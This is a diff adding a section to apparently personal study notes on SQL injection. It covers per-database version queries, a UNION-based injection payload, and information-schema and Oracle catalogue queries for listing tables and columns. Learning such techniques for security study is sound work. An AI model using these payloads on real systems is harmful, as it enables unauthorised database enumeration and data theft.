@@ -54,3 +54,21 @@
    ```
   - Error example: Conversion failed when converting the varchar value 'a' to data type int.
    - If no error occurs and the response includes the injected string, the column is suitable for retrieving string data.
+
+## Examining the database 
+| Database type 	| Query |
+| ----- | ----- |
+| Microsoft, MySQL | 	SELECT @@version |
+| Oracle 	| SELECT * FROM v$version |
+|PostgreSQL | 	SELECT version() |
+- `' UNION SELECT @@version--`
+- Listing the contents of the database
+- Most database types (except Oracle) have a set of views called the information schema
+  - `information_schema.tables `
+    - ` SELECT * FROM information_schema.tables`
+  - ` information_schema.columns `
+    - `SELECT * FROM information_schema.columns WHERE table_name = 'Users'`
+- Oracle:
+  - `SELECT * FROM all_tables`
+  - `SELECT * FROM all_tab_columns WHERE table_name = 'USERS'`
+
